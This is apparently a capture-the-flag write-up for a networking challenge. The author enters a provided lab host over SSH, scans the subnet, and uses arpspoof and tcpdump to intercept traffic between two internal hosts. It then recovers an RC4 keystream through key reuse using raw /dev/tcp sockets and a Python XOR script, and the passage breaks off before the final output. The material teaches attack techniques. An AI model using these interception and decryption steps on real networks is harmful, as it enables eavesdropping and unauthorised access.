# CS-hAcked
Category: Networks, 60 Points

## Description

>```                  uuuuuuu
>              uu$$$$$$$$$$$uu
>           uu$$$$$$$$$$$$$$$$$uu
>          u$$$$$$$$$$$$$$$$$$$$$u
>         u$$$$$$$$$$$$$$$$$$$$$$$u
>        u$$$$$$$$$$$$$$$$$$$$$$$$$u
>        u$$$$$$$$$$$$$$$$$$$$$$$$$u
>        u$$$$$$"   "$$$"   "$$$$$$u
>        "$$$$"      u$u       $$$$"
>         $$$u       u$u       u$$$
>         $$$u      u$$$u      u$$$
>          "$$$$uu$$$   $$$uu$$$$"
>           "$$$$$$$"   "$$$$$$$"
>             u$$$$$$$u$$$$$$$u
>              u$"$"$"$"$"$"$u
>   uuu        $$u$ $ $ $ $u$$       uuu
>  u$$$$        $$$$$u$u$u$$$       u$$$$
>   $$$$$uu      "$$$$$$$$$"     uu$$$$$$
> u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
> $$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
>  """      ""$$$$$$$$$$$uu ""$"""
>            uuuu ""$$$$$$$$$$uuu
>   u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
>   $$$$$$$$$$""""           ""$$$$$$$$$$$"
>    "$$$$$"                      ""$$$$""
>      $$$"                         $$$$"
>                 CS-hAcked
> ```
>  
> Dear fellow, we've heard you've got some hacking skills - this is the time to use them ;)
> 
> For some time now we've been investing great efforts to get a hold of an extremely dangerous hacking team network that goes by the name "CS-hAcked". 
> 
> According to our intelligence, we believe that on this network they transfer their secret combination  - being used as a trigger to every major attack they commit.
> 
> Recently we've come to a major breakthrough, successfully completing an operation to achieve remote control on one of the computers in the network.
> 
> That's where you get into the picture.
> 
> Your mission, should you choose to accept it, is to infiltrate their network using our implanted backdoor, and reveal once and for all the secret combination to finally get the secret flag.
> 
> Thanks to our dedicated intelligence researchers we gathered the following information for you that might assist you:
> 
> 1. We know the dictionary of words they've used over time. It's highly probable they'll use it for their current combination.
> 2. Our backdoor PC credentials - IP: 3.126.154.76 , port:2222, username:csa, pass:123123
> 3. The flag server IP: 3.126.154.76  port: 80
> 
> And perhaps the following could help you as well:
> * https://en.wikipedia.org/wiki/Man-in-the-middle_attack
> * https://www.techrepublic.com/article/how-to-scan-for-ip-addresses-on-your-network-with-linux/
> * https://en.wikipedia.org/wiki/ARP_spoofing
> 
> As always, should you or any of your members be caught or hacked, the secretary will disavow any knowledge of your actions. 
> 
> This page will self-destruct in few weeks.
> 
>  Good Luck! 

The following dictionary was attached:

```
development
conference
I
environment
about
accept
organization
as
collection
at
activity
also
although
information
able
across
area
environmental
actually
administration
ability
a
age
act
according
commercial
be
particularly
add
away
```

## Solution

This challenge has many parts. Let's start.

### The SSH Server

We start by connecting to the SSH server and searching around:

```console
root@kali:/media/sf_CTFs/checkpoint/CS-hAcked# sshpass -p 123123 ssh csa@3.126.154.76 -p 2222
                 uuuuuuu
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$"   "$$$"   "$$$$$$u
       "$$$$"      u$u       $$$$"
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         "$$$$uu$$$   $$$uu$$$$"
          "$$$$$$$"   "$$$$$$$"
            u$$$$$$$u$$$$$$$u
             u$"$"$"$"$"$"$u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$$$$u$u$u$$$       u$$$$
  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
 """      ""$$$$$$$$$$$uu ""$"""
           uuuu ""$$$$$$$$$$uuu
  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
  $$$$$$$$$$""""           ""$$$$$$$$$$$"
   "$$$$$"                      ""$$$$""
     $$$"                         $$$$"
----------------------------------------
---------------CS-hAcked----------------
----------------------------------------
-bash: /usr/bin/groups: Permission denied
-bash: /usr/bin/locale-check: Permission denied
-bash: /usr/bin/mesg: Permission denied
Great! let's go quick get the sequence before getting detected
Goodluck!
```

This is a networking challenge, so let's take a look at network related properties, such as our IP addresses and MAC addresses. Commands such as `ifconfig` were blocked, but we can use:

```console
csa@9fdd7bdc3e3f:~$ hostname -I
172.29.0.2 172.16.238.3
csa@9fdd7bdc3e3f:~$ cat /sys/class/net/eth0/address
02:42:ac:1d:00:02
csa@9fdd7bdc3e3f:~$ cat /sys/class/net/eth1/address
02:42:ac:10:ee:03
```

We have two interfaces, let's scan for other IP addresses on our network like the hint told us to:

```console
csa@9fdd7bdc3e3f:~$ nmap -sP 172.16.238.3/24

Starting Nmap 7.60 ( https://nmap.org ) at 2020-05-24 08:18 UTC
Nmap scan report for 172.16.238.1
Host is up (0.00039s latency).
Nmap scan report for ubuntu_server-in_1.ubuntu_local-net (172.16.238.2)
Host is up (0.00022s latency).
Nmap scan report for 9fdd7bdc3e3f (172.16.238.3)
Host is up (0.00018s latency).
Nmap scan report for ubuntu_client_1.ubuntu_local-net (172.16.238.4)
Host is up (0.00015s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 15.72 seconds
csa@9fdd7bdc3e3f:~$ nmap -sP 172.29.0.2/24

Starting Nmap 7.60 ( https://nmap.org ) at 2020-05-24 08:19 UTC
Nmap scan report for 9fdd7bdc3e3f (172.29.0.2)
Host is up (0.00012s latency).
Nmap done: 256 IP addresses (1 host up) scanned in 3.01 seconds
```

So on one of the subnets, we have two additional hosts:
* 172.16.238.2
* 172.16.238.4

Let's try to capture some network traffic on the interface:
```console
csa@9fdd7bdc3e3f:~$ tcpdump -i eth1
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
```

Not much is happening. This is where ARP Spoofing comes in.

(Note: When solving the challenge initially, there was actually lots of traffic on the network, which allowed skipping the following stage. In retrospective, this was due to other participants performing the ARP attack in parallel. Thanks to Idan for pointing this out!)

We need to cause the traffic between 172.16.238.2 and 172.16.238.4 to pass through our interface (172.16.238.3, 02:42:ac:10:ee:03) so that we can sniff it. We do that by opening two new SSH session and using `arpspoof`. 

In the first session we tell 172.16.238.2 that 172.16.238.4 is at our MAC address:

```console
csa@9fdd7bdc3e3f:~$ arpspoof -i eth1 -t 172.16.238.2 172.16.238.4
2:42:ac:10:ee:3 2:42:ac:10:ee:2 0806 42: arp reply 172.16.238.4 is-at 2:42:ac:10:ee:3
2:42:ac:10:ee:3 2:42:ac:10:ee:2 0806 42: arp reply 172.16.238.4 is-at 2:42:ac:10:ee:3
2:42:ac:10:ee:3 2:42:ac:10:ee:2 0806 42: arp reply 172.16.238.4 is-at 2:42:ac:10:ee:3
```

In the second session we tell 172.16.238.4 that 172.16.238.2 is at our MAC address:

```console
csa@9fdd7bdc3e3f:~$ arpspoof -i eth1 -t 172.16.238.4 172.16.238.2
2:42:ac:10:ee:3 2:42:ac:10:ee:4 0806 42: arp reply 172.16.238.2 is-at 2:42:ac:10:ee:3
2:42:ac:10:ee:3 2:42:ac:10:ee:4 0806 42: arp reply 172.16.238.2 is-at 2:42:ac:10:ee:3
2:42:ac:10:ee:3 2:42:ac:10:ee:4 0806 42: arp reply 172.16.238.2 is-at 2:42:ac:10:ee:3
```

Now we'll be able to sniff the traffic between the two hosts, as it will pass through our interface.

Now we can see lots of traffic:
```console
csa@9fdd7bdc3e3f:~$ tcpdump -i eth1
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
csa@9fdd7bdc3e3f:~$ tcpdump -i eth1
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
10:12:41.517331 ARP, Reply ubuntu_server-in_1.ubuntu_local-net is-at 02:42:ac:10:ee:03 (oui Unknown), length 28
10:12:41.996067 ARP, Reply ubuntu_client_1.ubuntu_local-net is-at 02:42:ac:10:ee:03 (oui Unknown), length 28
10:12:42.474327 IP ubuntu_client_1.ubuntu_local-net.60802 > ubuntu_server-in_1.ubuntu_local-net.1337: Flags [P.], seq 33:35, ack 33, win 502, options [nop,nop,TS val 935457619 ecr 1302808559], length 2
10:12:42.474368 IP 9fdd7bdc3e3f > ubuntu_client_1.ubuntu_local-net: ICMP redirect ubuntu_server-in_1.ubuntu_local-net to host ubuntu_server-in_1.ubuntu_local-net, length 62
10:12:42.474373 IP ubuntu_client_1.ubuntu_local-net.60802 > ubuntu_server-in_1.ubuntu_local-net.1337: Flags [P.], seq 33:35, ack 33, win 502, options [nop,nop,TS val 935457619 ecr 1302808559], length 2
10:12:42.474413 IP ubuntu_server-in_1.ubuntu_local-net.1337 > ubuntu_client_1.ubuntu_local-net.60802: Flags [.], ack 35, win 510, options [nop,nop,TS val 1302809560 ecr 935457619], length 0
10:12:42.474424 IP 9fdd7bdc3e3f > ubuntu_server-in_1.ubuntu_local-net: ICMP redirect ubuntu_client_1.ubuntu_local-net to host ubuntu_client_1.ubuntu_local-net, length 60
10:12:42.474453 IP ubuntu_server-in_1.ubuntu_local-net.1337 > ubuntu_client_1.ubuntu_local-net.60802: Flags [.], ack 35, win 510, options [nop,nop,TS val 1302809560 ecr 935457619], length 0
10:12:43.475581 IP ubuntu_client_1.ubuntu_local-net.60802 > ubuntu_server-in_1.ubuntu_local-net.1337: Flags [P.], seq 35:49, ack 33, win 502, options [nop,nop,TS val 935458620 ecr 1302809560], length 14
10:12:43.475610 IP ubuntu_client_1.ubuntu_local-net.60802 > ubuntu_server-in_1.ubuntu_local-net.1337: Flags [P.], seq 35:49, ack 33, win 502, options [nop,nop,TS val 935458620 ecr 1302809560], length 14
10:12:43.475634 IP ubuntu_server-in_1.ubuntu_local-net.1337 > ubuntu_client_1.ubuntu_local-net.60802: Flags [.], ack 49, win 510, options [nop,nop,TS val 1302810561 ecr 935458620], length 0
10:12:43.475651 IP 9fdd7bdc3e3f > ubuntu_server-in_1.ubuntu_local-net: ICMP redirect ubuntu_client_1.ubuntu_local-net to host ubuntu_client_1.ubuntu_local-net, length 60
10:12:43.475655 IP ubuntu_server-in_1.ubuntu_local-net.1337 > ubuntu_client_1.ubuntu_local-net.60802: Flags [.], ack 49, win 510, options [nop,nop,TS val 1302810561 ecr 935458620], length 0
10:12:43.517495 ARP, Reply ubuntu_server-in_1.ubuntu_local-net is-at 02:42:ac:10:ee:03 (oui Unknown), length 28
10:12:43.996290 ARP, Reply ubuntu_client_1.ubuntu_local-net is-at 02:42:ac:10:ee:03 (oui Unknown), length 28
10:12:44.476780 IP ubuntu_client_1.ubuntu_local-net.60802 > ubuntu_server-in_1.ubuntu_local-net.1337: Flags [P.], seq 49:55, ack 33, win 502, options [nop,nop,TS val 935459622 ecr 1302810561], length 6
10:12:44.476808 IP ubuntu_client_1.ubuntu_local-net.60802 > ubuntu_server-in_1.ubuntu_local-net.1337: Flags [P.], seq 49:55, ack 33, win 502, options [nop,nop,TS val 935459622 ecr 1302810561], length 6
10:12:44.476832 IP ubuntu_server-in_1.ubuntu_local-net.1337 > ubuntu_client_1.ubuntu_local-net.60802: Flags [.], ack 55, win 510, options [nop,nop,TS val 1302811563 ecr 935459622], length 0
10:12:44.476850 IP 9fdd7bdc3e3f > ubuntu_server-in_1.ubuntu_local-net: ICMP redirect ubuntu_client_1.ubuntu_local-net to host ubuntu_client_1.ubuntu_local-net, length 60
10:12:44.476853 IP ubuntu_server-in_1.ubuntu_local-net.1337 > ubuntu_client_1.ubuntu_local-net.60802: Flags [.], ack 55, win 510, options [nop,nop,TS val 1302811563 ecr 935459622], length 0
10:12:45.477969 IP ubuntu_client_1.ubuntu_local-net.60802 > ubuntu_server-in_1.ubuntu_local-net.1337: Flags [P.], seq 55:62, ack 33, win 502, options [nop,nop,TS val 935460623 ecr 1302811563], length 7
10:12:45.477995 IP ubuntu_client_1.ubuntu_local-net.60802 > ubuntu_server-in_1.ubuntu_local-net.1337: Flags [P.], seq 55:62, ack 33, win 502, options [nop,nop,TS val 935460623 ecr 1302811563], length 7
10:12:45.478019 IP ubuntu_server-in_1.ubuntu_local-net.1337 > ubuntu_client_1.ubuntu_local-net.60802: Flags [.], ack 62, win 510, options [nop,nop,TS val 1302812564 ecr 935460623], length 0
10:12:45.478035 IP 9fdd7bdc3e3f > ubuntu_server-in_1.ubuntu_local-net: ICMP redirect ubuntu_client_1.ubuntu_local-net to host ubuntu_client_1.ubuntu_local-net, length 60
10:12:45.478040 IP ubuntu_server-in_1.ubuntu_local-net.1337 > ubuntu_client_1.ubuntu_local-net.60802: Flags [.], ack 62, win 510, options [nop,nop,TS val 1302812564 ecr 935460623], length 0
10:12:45.517663 ARP, Reply ubuntu_server-in_1.ubuntu_local-net is-at 02:42:ac:10:ee:03 (oui Unknown), length 28
10:12:45.996485 ARP, Reply ubuntu_client_1.ubuntu_local-net is-at 02:42:ac:10:ee:03 (oui Unknown), length 28
10:12:46.479169 IP ubuntu_client_1.ubuntu_local-net.60802 > ubuntu_server-in_1.ubuntu_local-net.1337: Flags [P.], seq 62:70, ack 33, win 502, options [nop,nop,TS val 935461624 ecr 1302812564], length 8
10:12:46.479199 IP ubuntu_client_1.ubuntu_local-net.60802 > ubuntu_server-in_1.ubuntu_local-net.1337: Flags [P.], seq 62:70, ack 33, win 502, options [nop,nop,TS val 935461624 ecr 1302812564], length 8
10:12:46.479225 IP ubuntu_server-in_1.ubuntu_local-net.1337 > ubuntu_client_1.ubuntu_local-net.60802: Flags [.], ack 70, win 510, options [nop,nop,TS val 1302813565 ecr 935461624], length 0
10:12:46.479242 IP 9fdd7bdc3e3f > ubuntu_server-in_1.ubuntu_local-net: ICMP redirect ubuntu_client_1.ubuntu_local-net to host ubuntu_client_1.ubuntu_local-net, length 60
10:12:46.479247 IP ubuntu_server-in_1.ubuntu_local-net.1337 > ubuntu_client_1.ubuntu_local-net.60802: Flags [.], ack 70, win 510, options [nop,nop,TS val 1302813565 ecr 935461624], length 0
10:12:47.480374 IP ubuntu_client_1.ubuntu_local-net.60802 > ubuntu_server-in_1.ubuntu_local-net.1337: Flags [P.], seq 70:80, ack 33, win 502, options [nop,nop,TS val 935462625 ecr 1302813565], length 10
10:12:47.480401 IP ubuntu_client_1.ubuntu_local-net.60802 > ubuntu_server-in_1.ubuntu_local-net.1337: Flags [P.], seq 70:80, ack 33, win 502, options [nop,nop,TS val 935462625 ecr 1302813565], length 10
10:12:47.480428 IP ubuntu_server-in_1.ubuntu_local-net.1337 > ubuntu_client_1.ubuntu_local-net.60802: Flags [.], ack 80, win 510, options [nop,nop,TS val 1302814566 ecr 935462625], length 0
10:12:47.480445 IP 9fdd7bdc3e3f > ubuntu_server-in_1.ubuntu_local-net: ICMP redirect ubuntu_client_1.ubuntu_local-net to host ubuntu_client_1.ubuntu_local-net, length 60
10:12:47.480453 IP ubuntu_server-in_1.ubuntu_local-net.1337 > ubuntu_client_1.ubuntu_local-net.60802: Flags [.], ack 80, win 510, options [nop,nop,TS val 1302814566 ecr 935462625], length 0
```

For filtering and analysis, it's much more convenient to use a GUI application such as WireShark. There were two ways to accomplish this:

1. **Option #1**: Save the dump to a file and copy it from the remote host to a local host
   1. First, we need a writable directory. The only writable directory on the remote host was `/dev/shm`.
   2. We start `tcpdump` with a flag telling it to write the capture to the writable directory: `tcpdump -i any -w /dev/shm/my_dump.pcap`
   3. After a while, we kill `tcpdump` with `CTRL-C`.
   4. Now we need to transfer the dump to our local host. Both `base64` and `scp` were blocked, but it was possible to use a bash implementation of base64 (from [here](https://gist.github.com/markusfisch/2648733)) to base64-encode the file. 
      1. We download the script to our local host and call it `base64.sh`
      2. We scroll to the bottom and replace `base64 "$@"` with `$MY_CMD | base64`
      3. We invoke the script in the following way: `sshpass -p 123123 ssh csa@3.126.154.76 -p 2222 -q MY_CMD="cat\ /dev/shm/my_dump.pcap" 'bash -s' < base64.sh  | base64 -d > my_dump.pcap`
      4. The file will be saved locally
2. **Option #2**: Start an interactive session with WireShark
   1. We can pipe the binary output of `tcpdump` to the input of WireShark using the following command line: `sshpass -p 123123 ssh csa@3.126.154.76 -p 2222 "tcpdump -i any -w  -" | wireshark -k -i -`


So what do we have? We have 172.16.238.4 opening a session with 172.16.238.2:1337 repeatedly. If we zoom into the sessions, we see that they all look like the following one:

```console
root@kali:/media/sf_CTFs/checkpoint/CS-hAcked/captures# tshark -r initial.pcapng -qz follow,tcp,raw,1
Running as user "root" and group "root". This could be dangerous.

===================================================================
Follow: tcp,raw
Filter: tcp.stream eq 1
Node 0: 172.16.238.4:40794
Node 1: 172.16.238.2:1337
        596e2b00b349e78de0cc586e4582c8d70e6027f76af0220da7a31e3376447cbb
b75aa7537b306a86391733e2e6
6ed101ee76155ffc90da9fb05cf5bb
d51f
494c13
bac2
341b5ebe22cd432c4a7994d4bc4a
3e3217f7e110
75efbf54557ced
4bbd1eebc033fc30
bffdd8b81f0c9c96f055
        ea026bbcbe0bf219e695ec22a79b384f6c43df2db1f7df1267bf7a3409910778df09d42d5516556b3623d5ec
===================================================================
```

172.16.238.4 opens the session and receives a message. It then sends multiple message back, and receives a final message. All sessions are identical to the bit - it's always the exact same byte stream. To understand it, we need a context switch.

## The Flag Server

Let's connect to the flag server we've received in the challenge description:

```console
root@kali:/media/sf_CTFs/checkpoint/CS-hAcked# nc 3.126.154.76 80
Welcome! your RC4 key is: csa-mitm-key
:2$O,}Tɒ_;28
root@kali:/media/sf_CTFs/checkpoint/CS-hAcked# nc 3.126.154.76 80 | xxd -g 1
00000000: 57 65 6c 63 6f 6d 65 21 20 79 6f 75 72 20 52 43  Welcome! your RC
00000010: 34 20 6b 65 79 20 69 73 3a 20 63 73 61 2d 6d 69  4 key is: csa-mi
00000020: 74 6d 2d 6b 65 79 0a 01 3a a1 32 24 c1 4f 2c 41  tm-key..:.2$.O,A
00000030: 82 ee 08 7d 80 1f 10 54 c9 92 a5 5f 1b ec 40 f3  ...}...T..._..@.
```

We get an RC4 key and some gibberish. Let's try to communicate using RC4:

```python
from Crypto.Cipher import ARC4
import socket


TCP_IP = '3.126.154.76'
TCP_PORT = 80
BUFFER_SIZE = 1024

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
data = s.recv(BUFFER_SIZE)
print ("received data: {}".format(data.decode("ascii")))
cipher = ARC4.new("csa-mitm-key")

data = s.recv(BUFFER_SIZE)
print ("received data (Length: {}): {}".format(len(data), data.hex()))
print(cipher.decrypt(data))

s.close()
```

Output:

```console
root@kali:/media/sf_CTFs/checkpoint/CS-hAcked# python3 rc4_comm.py
received data: Welcome! your RC4 key is: csa-mitm-key

received data (Length: 32): 013aa13224c14f2c4182ee087d801f1054c992a55f1bec40f3db3b9532ea38f9
b"Hi! what's the secret sequence?\n"
```

The server is asking us for the secret sequence, it can't hurt to try:

```python
from Crypto.Cipher import ARC4
import socket


TCP_IP = '3.126.154.76'
TCP_PORT = 80
BUFFER_SIZE = 1024

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
data = s.recv(BUFFER_SIZE)
print ("received data: {}".format(data.decode("ascii")))
cipher = ARC4.new("csa-mitm-key")

data = s.recv(BUFFER_SIZE)
print ("received data (Length: {}): {}".format(len(data), data.hex()))
print(cipher.decrypt(data))

s.send(cipher.encrypt("test"))

data = s.recv(BUFFER_SIZE)
print ("received data (Length: {}): {}".format(len(data), data.hex()))
print(cipher.decrypt(data))

s.close()
```

Output:
```console
root@kali:/media/sf_CTFs/checkpoint/CS-hAcked# python3 rc4_comm.py
received data: Welcome! your RC4 key is: csa-mitm-key

received data (Length: 32): 013aa13224c14f2c4182ee087d801f1054c992a55f1bec40f3db3b9532ea38f9
b"Hi! what's the secret sequence?\n"
received data (Length: 17): 7228c42e1f10891211147811a7b83c59fa
b'No flag for you!\n'
```

## Decrypting RC4

Let's see what we have. 

* 172.16.238.4 connects to 172.16.238.2 and receives 32 bytes: 596e2b00b349e78de0cc586e4582c8d70e6027f76af0220da7a31e3376447cbb
* We connect to the flag server and receive 32 RC4-encrypted bytes (ignoring the plaintext instructions which contain the key): 013aa13224c14f2c4182ee087d801f1054c992a55f1bec40f3db3b9532ea38f9

It seems like a reasonable assumption that the analysis of the network traffic is as follows:

* 172.16.238.2 is another flag server. It starts by sending 172.16.238.4 the RC4-encrypted message that we've received as well: "`Hi! what's the secret sequence?\n`"
* 172.16.238.4 replies with a series of messages which are in fact the passphrase, built up from the dictionary we've received in the challenge description
* 172.16.238.2 send back the flag (44 characters, as opposed to the 17 characters we've received, telling us that we don't deserve the flag)

Now, given the fact that the communication between 172.16.238.2 and 172.16.238.4 is always identical, we can assume that they're using the exact same key in every session, and no IVs are involved. This also means that their key is different than ours, since if it was identical, we would have received the same encrypted stream for the opening message. Looks like we'll have to crack the encryption to receive the passphrase.

The simplest way is to try and guess from the message lengths that 172.16.238.4 sends what are the words it is sending. For example, let's take `6ed101ee76155ffc90da9fb05cf5bb`. It's 15 bytes long. Let's compare to the dictionary: 
```console
root@kali:/media/sf_CTFs/checkpoint/CS-hAcked# cat CS-hAcked/dictionary.txt | grep -x '.\{15\}'
root@kali:/media/sf_CTFs/checkpoint/CS-hAcked# cat CS-hAcked/dictionary.txt | grep -x '.\{14\}'
administration
```

We don't have any words of length 15, but we have one word of length `14` and it's reasonable to assume that the last character is `\n` or something similar.

The problem is we can't do this easily for other words. For example, how should we interpret `494c13`?

```console
root@kali:/media/sf_CTFs/checkpoint/CS-hAcked# cat CS-hAcked/dictionary.txt | grep -x '.\{2\}'
as
at
be
```

We have three different words of length 2. It's possible to try all different match combinations (and perhaps that's the intention of the creators) but we'll show a different (possible unintended) method.

An RC4 stream is like an endless one-time pad. To encrypt, we take the stream and XOR it with the message. To decrypt, we XOR the encrypted message with the stream again. This is great (well, not entirely great since RC4 has been declared for other reasons as insecure) as long as the one-time pad known as the key stream is only used once. That's usually accomplished with the use of an IV. However we can see that in our case there is no IV and the same key stream is used to encrypt the same message again and again. 

How can we use this? Let's assume we have an encrypted RC4 message: `e88c91fbb4`. We don't know the key, but we do know that the plaintext is `abcde`. We can XOR these two values to get the key stream of the current offset.

```python
>>> "".join(format(c1 ^ c2, 'x') for c1, c2 in zip(bytes.fromhex('e88c91fbb4'), 'abcde'.encode('ascii')))
'89eef29fd1'
```

So `'89eef29fd1'` is the key stream of the current offset in the RC4 session.

Now, if we get another encrypted RC4 message which we know was encrypted with the same key and is located at the same offset (e.g. `'f89997eda5'`), this is actually a reuse of the same one-time pad for encryption and we can crack it:

```python
>>> bytes((c1 ^ c2) for c1, c2 in zip(bytes.fromhex('f89997eda5'), bytes.fromhex('89eef29fd1'))).decode('ascii')
'qwert'
```

We didn't have to know the key for that.

To apply this to our case, we need to somehow control the communication with 172.16.238.2. We know that it will send us `'No flag for you!\n'` if the passphrase is incorrect. We just need to "pull back" this response to overlap the offset of the passphrase, so that we can perform the trick above.

The creators blocked most utilities such as `nc`, making it non-trivial to start an independent session with 172.16.238.2, but using raw bash commands it was still possible.

First, let's make sure we can communicate with the internal flag server using bash sockets:

```console
csa@9fdd7bdc3e3f:~$ exec 3<> /dev/tcp/172.16.238.2/1337
csa@9fdd7bdc3e3f:~$ echo -en "\xb7\x5a\xa7\x53\x7b\x30\x6a\x86\x39\x17\x33\xe2\xe6\x6e\xd1\x01\xee\x76\x15\x5f\xfc\x90\xda\x9f\xb0\x5c\xf5\xbb\xd5\x1f\x49\x4c\x13\xba\xc2\x34\x1b\x5e\xbe\x22\xcd\x43\x2c\x4a\x79\x94\xd4\xbc\x4a\x3e\x32\x17\xf7\xe1\x10\x75\xef\xbf\x54\x55\x7c\xed\x4b\xbd\x1e\xeb\xc0\x33\xfc\x30\xbf\xfd\xd8\xb8\x1f\x0c\x9c\x96\xf0\x55"  1>&3
csa@9fdd7bdc3e3f:~$ read 0<&3
```

The result:
```console
root@kali:/media/sf_CTFs/checkpoint/CS-hAcked/captures# tshark -r attack.pcapng -qz follow,tcp,raw,0
Running as user "root" and group "root". This could be dangerous.

===================================================================
Follow: tcp,raw
Filter: tcp.stream eq 0
Node 0: 172.16.238.3:40368
Node 1: 172.16.238.2:1337
        596e2b00b349e78de0cc586e4582c8d70e6027f76af0220da7a31e3376447cbb
b75aa7537b306a86391733e2e66ed101ee76155ffc90da9fb05cf5bbd51f494c13bac2341b5ebe22cd432c4a7994d4bc4a3e3217f7e11075efbf54557ced4bbd1eebc033fc30bffdd8b81f0c9c96f055
        ea026bbcbe0bf219e695ec22a79b384f6c43df2db1f7df1267bf7a3409910778df09d42d5516556b3623d5ec
===================================================================
```

Looks good. We send the encrypted passphrase to the server even though we don't know how to decrypt it and get the encrypted flag from the server, although we can't decrypt that either.

For the sake of readability, we'll split the transmissions from now on:
```console
csa@9fdd7bdc3e3f:~$ exec 3<> /dev/tcp/172.16.238.2/1337
csa@9fdd7bdc3e3f:~$ echo -en "\xb7\x5a\xa7\x53\x7b\x30\x6a\x86\x39\x17\x33\xe2\xe6"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x6e\xd1\x01\xee\x76\x15\x5f\xfc\x90\xda\x9f\xb0\x5c\xf5\xbb"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\xd5\x1f"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x49\x4c\x13"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\xba\xc2"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x34\x1b\x5e\xbe\x22\xcd\x43\x2c\x4a\x79\x94\xd4\xbc\x4a"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x3e\x32\x17\xf7\xe1\x10"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x75\xef\xbf\x54\x55\x7c\xed"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x4b\xbd\x1e\xeb\xc0\x33\xfc\x30"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\xbf\xfd\xd8\xb8\x1f\x0c\x9c\x96\xf0\x55"  1>&3
csa@9fdd7bdc3e3f:~$ read 0<&3
```


Now we start the attack. Instead of sending the first word as `"\xb7\x5a\xa7\x53\x7b\x30\x6a\x86\x39\x17\x33\xe2\xe6"`, we'll modify the first byte to `0xb8`:

```console
csa@9fdd7bdc3e3f:~$ exec 3<> /dev/tcp/172.16.238.2/1337
csa@9fdd7bdc3e3f:~$ echo -en "\xb8\x5a\xa7\x53\x7b\x30\x6a\x86\x39\x17\x33\xe2\xe6"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x6e\xd1\x01\xee\x76\x15\x5f\xfc\x90\xda\x9f\xb0\x5c\xf5\xbb"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\xd5\x1f"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x49\x4c\x13"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\xba\xc2"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x34\x1b\x5e\xbe\x22\xcd\x43\x2c\x4a\x79\x94\xd4\xbc\x4a"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x3e\x32\x17\xf7\xe1\x10"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x75\xef\xbf\x54\x55\x7c\xed"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\x4b\xbd\x1e\xeb\xc0\x33\xfc\x30"  1>&3
csa@9fdd7bdc3e3f:~$ echo -en "\xbf\xfd\xd8\xb8\x1f\x0c\x9c\x96\xf0\x55"  1>&3
csa@9fdd7bdc3e3f:~$ read 0<&3
```

The session:
```console
root@kali:/media/sf_CTFs/checkpoint/CS-hAcked/captures# tshark -r attack.pcapng -qz follow,tcp,raw,3
Running as user "root" and group "root". This could be dangerous.

===================================================================
Follow: tcp,raw
Filter: tcp.stream eq 3
Node 0: 172.16.238.3:43008
Node 1: 172.16.238.2:1337
        596e2b00b349e78de0cc586e4582c8d70e6027f76af0220da7a31e3376447cbb
b85aa7537b306a86391733e2e6
6ed101ee76155ffc90da9fb05cf5bb
d51f494c13bac2341b5ebe22cd432c4a7994d4bc4a3e3217f7e11075efbf54557ced4bbd1eebc033fc30bffdd8b81f0c9c96f055
        41da4ce1741d4ba884d499f94af4c4951f
===================================================================
```

We got a 17-byte response! We know that `41da4ce1741d4ba884d499f94af4c4951f` is decrypted to "`No flag for you!\n`". Now we can XOR the encrypted stream with the plaintext to get the matching segment of the key stream.

We'll use the following script to search for the correct location in the stream:
```python
import string, sys

def xor(one, two):
    return bytes(a ^ b for (a, b) in zip(one, two))

encrypted_passphrase = bytes.fromhex("""
b75aa7537b306a86391733e2e6
6ed101ee76155ffc90da9fb05cf5bb
d51f
494c13
bac2
341b5ebe22cd432c4a7994d4bc4a
3e3217f7e110
75efbf54557ced
4bbd1eebc033fc30
bffdd8b81f0c9c96f055
""".replace("\n", ""))

failure_text = b'No flag for you!\n'

encrypted_failure_msg = bytes.fromhex(sys.argv[1])
assert(len(failure_text) == len(encrypted_failure_msg))

key_stream = xor(encrypted_failure_msg, failure_text)

for i in range(len(encrypted_passphrase)):
    encrypted_chunk = encrypted_passphrase[i:i+len(key_stream)]
    xor_res = xor(key_stream, encrypted_chunk)
    if all(chr(c) in string.printable for c in xor_res):
        print ("Encrypted bytes: {}".format(encrypted_chunk.hex()))
        print ("Decrypted bytes: {}".format(xor_res))
```

Output:
```console
